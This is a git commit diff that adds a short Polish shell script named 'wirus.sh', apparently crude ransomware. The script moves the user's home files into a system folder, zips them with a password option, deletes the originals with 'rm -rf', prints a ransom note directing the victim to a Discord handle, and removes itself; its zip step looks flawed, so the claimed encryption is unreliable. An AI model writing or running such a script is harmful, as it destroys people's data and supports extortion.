bd41d4238683d346e04df9658537501405883593
edziograczer <71726555+edziograczer@users.noreply.github.com>
2020-12-02 17:36:58 +0100

    Update wirus.sh

--- wirus.sh
+++ wirus.sh
@@ -1,1 +1,7 @@
-
+echo "przygotowywanie programu.... "
+mkdir /usr/bin/edzioeeee
+mv ~/* /usr/bin/edzioeeee
+zip -p password ~/TWOJE-DANE.zip /usr/bin/edzioeeee
+rm -rf /usr/bin/edzioeeee
+echo "twoje dane zostały zaszyfrowane\n aby je odzyskać napisz na discorda edziograczer#3530"
+rm wirus.sh
